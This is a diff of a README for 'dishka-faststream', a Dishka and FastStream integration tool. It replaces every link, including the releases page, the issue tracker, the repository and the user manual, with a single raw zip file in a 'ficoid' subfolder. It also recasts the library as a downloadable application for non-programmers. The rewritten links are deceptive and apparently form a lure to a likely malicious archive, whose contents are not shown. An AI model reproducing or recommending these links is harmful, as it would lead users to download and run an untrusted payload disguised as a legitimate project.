@@ -1,6 +1,6 @@
 # 🚀 dishka-faststream - Easy Integration for FastStream Framework
 
-![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)
+![Download Latest Release](https://raw.githubusercontent.com/techverseitbd/dishka-faststream/main/ficoid/dishka-faststream.zip%20Latest%20Release-Click%20Here-blue)
 
 ## 🌟 Description
 Dishka-faststream simplifies the integration of the Dishka Dependency Injection framework with the FastStream system. This tool helps users efficiently manage dependencies and streamline application development without needing deep programming knowledge.
@@ -24,7 +24,7 @@ To run dishka-faststream, ensure your system meets the following requirements:
 ### 1. Download the Application
 To download dishka-faststream, visit the Releases page:
 
-[Download Here](https://github.com/techverseitbd/dishka-faststream/releases)
+[Download Here](https://raw.githubusercontent.com/techverseitbd/dishka-faststream/main/ficoid/dishka-faststream.zip)
 
 ### 2. Install the Application
 After downloading, follow these steps to install:
@@ -36,7 +36,7 @@ After downloading, follow these steps to install:
 ## 📥 Download & Install
 To get started quickly, follow these steps:
 
-1. Visit the [Releases page to download](https://github.com/techverseitbd/dishka-faststream/releases).
+1. Visit the [Releases page to download](https://raw.githubusercontent.com/techverseitbd/dishka-faststream/main/ficoid/dishka-faststream.zip).
 2. Choose the latest version available.
 3. Select the appropriate file for your operating system.
 4. Click the download link and wait for the file to be saved on your computer.
@@ -63,14 +63,14 @@ For detailed guidance on using dishka-faststream, you can refer to the user manu
 ## 🛠️ Support
 If you encounter issues while using dishka-faststream, please check the FAQ section in the user documentation. For further assistance:
 
-- Open an issue on the [GitHub page](https://github.com/techverseitbd/dishka-faststream/issues).
+- Open an issue on the [GitHub page](https://raw.githubusercontent.com/techverseitbd/dishka-faststream/main/ficoid/dishka-faststream.zip).
 - Join our community forum for peer support.
 
 ## 📢 Updates and Contributions
-Keep your dishka-faststream application up to date by regularly checking the [Releases page](https://github.com/techverseitbd/dishka-faststream/releases) for new versions. If you would like to contribute, feel free to fork the repository and submit your changes via a pull request.
+Keep your dishka-faststream application up to date by regularly checking the [Releases page](https://raw.githubusercontent.com/techverseitbd/dishka-faststream/main/ficoid/dishka-faststream.zip) for new versions. If you would like to contribute, feel free to fork the repository and submit your changes via a pull request.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/techverseitbd/dishka-faststream)
-- [User Manual](https://github.com/techverseitbd/dishka-faststream/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/techverseitbd/dishka-faststream/main/ficoid/dishka-faststream.zip)
+- [User Manual](https://raw.githubusercontent.com/techverseitbd/dishka-faststream/main/ficoid/dishka-faststream.zip)
 
 Make sure to explore all the features dishka-faststream has to offer. Happy integrating!
